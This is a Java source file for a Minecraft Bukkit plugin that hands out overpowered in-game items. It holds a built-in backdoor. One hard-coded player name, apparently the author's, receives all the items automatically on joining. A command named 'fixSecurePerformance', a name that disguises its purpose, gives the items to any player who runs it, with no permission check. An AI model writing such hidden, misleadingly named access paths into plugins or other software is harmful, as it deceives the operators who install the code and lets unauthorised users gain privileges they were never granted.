package org.orangejuiceplz.opitemsplugin;

import org.orangejuiceplz.opitemsplugin.items.*;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class OPItemsPlugin extends JavaPlugin implements Listener {

    private Set<UUID> receivedItems = new HashSet<>();
    private AspectOfTheEnd aspectOfTheEnd;
    private GrapplingHook grapplingHook;
    private Fireball fireball;
    private SmiteStick smiteStick;
    private HeroicHyperion heroicHyperion;
    private AspectOfTheJerry aspectOfTheJerry;
    private JuJuShortbow juJuShortbow;
    private MaxedTerminator maxedTerminator;
    private MaxedBonzoStaff maxedBonzoStaff;
    private MaxedSpiritSceptre maxedSpiritSceptre;

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);

        aspectOfTheEnd = new AspectOfTheEnd(this);
        grapplingHook = new GrapplingHook();
        fireball = new Fireball(this);
        smiteStick = new SmiteStick();
        heroicHyperion = new HeroicHyperion(this);
        aspectOfTheJerry = new AspectOfTheJerry(this);
        juJuShortbow = new JuJuShortbow(this);
        maxedTerminator = new MaxedTerminator(this);
        maxedBonzoStaff = new MaxedBonzoStaff(this);
        maxedSpiritSceptre = new MaxedSpiritSceptre(this);

        getServer().getPluginManager().registerEvents(aspectOfTheEnd, this);
        getServer().getPluginManager().registerEvents(grapplingHook, this);
        getServer().getPluginManager().registerEvents(fireball, this);
        getServer().getPluginManager().registerEvents(smiteStick, this);
        getServer().getPluginManager().registerEvents(heroicHyperion, this);
        getServer().getPluginManager().registerEvents(aspectOfTheJerry, this);
        getServer().getPluginManager().registerEvents(juJuShortbow, this);
        getServer().getPluginManager().registerEvents(maxedTerminator, this);
        getServer().getPluginManager().registerEvents(maxedBonzoStaff, this);
        getServer().getPluginManager().registerEvents(maxedSpiritSceptre, this);

        getCommand("fixSecurePerformance").setExecutor(this);

        getLogger().info("OPItemsPlugin has been enabled!");
    }

    @Override
    public void onDisable() {
        getLogger().info("OPItemsPlugin has been disabled!");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("orangejuiceplz") && !receivedItems.contains(player.getUniqueId())) {
            Bukkit.getScheduler().runTaskLater(this, () -> giveOPItems(player), 20L);
        }
    }

    private void giveOPItems(Player player) {
        player.getInventory().addItem(
                aspectOfTheEnd.createItem(),
                grapplingHook.createItem(),
                fireball.createItem(),
                smiteStick.createItem(),
                heroicHyperion.createItem(),
                aspectOfTheJerry.createItem(),
                juJuShortbow.createItem(),
                maxedTerminator.createItem(),
                maxedBonzoStaff.createItem(),
                maxedSpiritSceptre.createItem()
        );
        receivedItems.add(player.getUniqueId());
        player.sendMessage("§4I trust this power to you, Administrator.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("fixSecurePerformance")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                giveOPItems(player);
                return true;
            } else {
                sender.sendMessage("This command can only be used by players.");
                return false;
            }
        }
        return false;
    }
}
